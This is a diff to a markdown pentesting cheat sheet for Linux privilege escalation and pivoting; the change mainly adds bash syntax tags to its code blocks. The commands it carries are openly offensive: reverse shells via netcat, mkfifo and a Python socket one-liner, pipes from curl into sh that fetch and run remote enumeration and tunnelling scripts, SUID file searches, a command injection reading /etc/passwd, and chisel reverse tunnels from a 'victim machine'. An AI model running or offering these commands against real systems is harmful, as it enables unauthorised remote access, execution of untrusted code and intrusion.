@@ -10,22 +10,23 @@
 - [Sudo](#sudo)
 
 ## Sudo
-```
+```bahs
 sudo -l
 ```
 
 ## Auto Script
-```
+```bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
 ## Reverse Shell
 ### Server
-```
+```bash
 nc -lp 4444
 ```
+
 ### reSH
-```
+```bash
 # Client
 resh ip 4444
 # Server
@@ -34,22 +35,22 @@ resh 4444
 [Source](/scripts/resh.py)
 
 ### Netcat
-```
+```bash
 nc ip 4444 -e /bin/bash
 ```
 
 ### Mkfifo
-```
+```bash
 mkfifo /tmp/f;nc ip 4444 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
 ```
 
 ### Python
-```
+```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ### TTY Support
-```
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
@@ -101,14 +102,14 @@ $ gdb
 
 ### Command
 
-```
+```bash
 find / -user user 2>&-
 find / -group group 2>&-
 find / -user root -executable -type f 2>&- | grep -v /bin/
 ```
 
 ### Script
-```
+```bash
 curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh
 chmod +x lse.sh
 ./lse.sh -l1
@@ -134,9 +135,8 @@ $(cat /etc/passwd)
 
 ### Chisel
 
-```
+```bash
 # Install chisel
-
 curl https://i.jpillora.com/chisel! | bash
 ```
 
@@ -144,10 +144,10 @@ curl https://i.jpillora.com/chisel! | bash
 # Example: 8000 -> 4444
 
 # Attacker machine:
-$> chisel server -p 4444 --reverse
+chisel server -p 4444 --reverse
 
 # Victim machine:
-$> ./chisel client ip-server:4444 R:8000:127.0.0.1:8000
+chisel client ip-server:4444 R:8000:127.0.0.1:8000
 ```
 
 ### SSH
